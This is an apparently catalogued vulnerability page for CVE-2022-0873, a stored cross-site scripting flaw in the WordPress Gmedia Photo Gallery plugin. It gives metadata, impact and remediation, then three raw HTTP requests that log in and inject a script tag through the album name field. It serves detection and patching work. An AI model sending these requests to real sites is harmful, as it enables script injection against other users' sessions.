---
layout: post
cve_id: CVE-2022-0873
title: WordPress Gmedia Photo Gallery Plugin < 1.20.0 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2022/CVE-2022-0873.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-0873.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: medium
impact: 'Successful exploitation could allow an attacker with high privileges, such
  as admin, to inject arbitrary JavaScript or HTML in the context of other users who
  view affected posts and pages, potentially leading to session hijacking, defacement,
  or other malicious actions.

  '
remediation: 'Update the Gmedia Photo Gallery plugin to version 1.20.0 or later to
  mitigate this vulnerability.

  '
reference:
- https://wpscan.com/vulnerability/d5ce4b8a-9aa5-4df8-b521-c2105990a87e
- https://wordpress.org/plugins/grand-media/
- https://nvd.nist.gov/vuln/detail/CVE-2022-0873
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 4.8
  cve-id: CVE-2022-0873
  epss-score: 0.00859
  epss-percentile: 0.74514
  cwe-id: CWE-79
  cpe: cpe:2.3:a:codeasily:gmedia_gallery:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 3
  vendor: codeasily
  product: gmedia_gallery
  framework: wordpress
tags:
- cve
- cve2022
- wp
- wordpress
- wp-plugin
- gmedia
- xss
- authenticated
---

## ðŸ” Vulnerability Description
The Gmedia Photo Gallery WordPress plugin before 1.20.0 does not sanitise and escape the album's name before outputting it in pages or posts with a media embed, which could allow high privilege users such as admin to perform Cross-Site Scripting (XSS) attacks even when the unfiltered-html capability is disallowed. (CVE-2022-0873)


## ðŸŒ HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Connection: close
Content-Length: 51
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Origin: /
Accept-Encoding: gzip

log=t4PAPg&pwd=XmIMO3&wp-submit=Log+In&testcookie=1
```

```nohighlight
GET /wp-admin/admin.php?page=GrandMedia_Albums HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin.php?page=GrandMedia_Albums HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Connection: close
Content-Length: 408
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

term[name]=p6hx'><script>alert(document.domain)</script>&term[description]=&term[meta][_orderby]=ID&term[meta][_order]=DESC&term[meta][_module_preset]=&term[global]=1&term[status]=publish&_wp_original_http_referer=http://www.victim.com/wp-admin/admin.php?page=GrandMedia_AddMedia&_wpnonce_terms=qnfSik&_wp_http_referer=/wp-admin/admin.php?page=GrandMedia_Albums&term[taxonomy]=gmedia_album&gmedia_album_save=
```

